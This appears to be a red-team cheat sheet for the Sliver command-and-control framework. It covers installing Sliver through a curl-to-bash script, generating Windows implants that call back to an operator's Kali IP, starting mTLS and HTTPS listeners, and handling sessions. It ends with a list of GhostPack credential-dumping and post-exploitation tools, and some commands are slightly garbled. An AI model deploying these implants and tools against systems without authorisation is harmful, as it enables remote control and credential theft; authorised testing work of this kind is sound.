## Sliver

Sliver is a cross-platform implant framework that supports C2 over Mutual-TLS, HTTP(S), and DNS. Implants are dynamically compiled with unique X.509 certificates signed by a per-instance certificate authority generated when you first run the binary. Implants support features such as dynamic code generation, compile-time obfuscation, process injection, anti-forensics, Windows process migration and Windows user token manipulation.

Reference: https://sliver.sh/docs?name=Getting+Started

### Initial Install
    $ apt-get install mingw-w64 binutils-mingw-w64 g++-mingw-w64
    $ git clone https://github.com/BishopFox/sliver.git
    $ sudo curl https://sliver.sh/install|sudo bash

Requires two dependences: MinGW and Metasploit.

### Usage
    $ sliver-server
    > armory  (will install all packages)
    > armory install [specify package]
    > armory update

Reference: [sliverarmory repositories · GitHub](https://github.com/orgs/sliverarmory/repositories)

### Generate Implants (Binary) 
    > generate --mtls <Kali IP> --save /opt/engagement --skip-symbols --os win
    > slivers (to see binary slivers created>

### Start mtls Listener
    > mtls 
    > jobs (will list the listeners created) use 3

### Start HTTPS Listener
    > https –website https://<IPaddress>
    > jobs (will list the listeners created) 

### Interact with Sessions
    > use 1 (session # created)

#### SLiver Implants
    https://github.com/GhostPack/SharpDPAPI.git
    https://github.com/GhostPack/SharpWMI.git
    https://github.com/GhostPack/KeeThief.git
    https://github.com/GhostPack/SharpUp.git
    https://github.com/GhostPack/SafetyKatz.git
    https://github.com/GhostPack/SharpDump.git
    https://github.com/GhostPack/SharpRoast.git
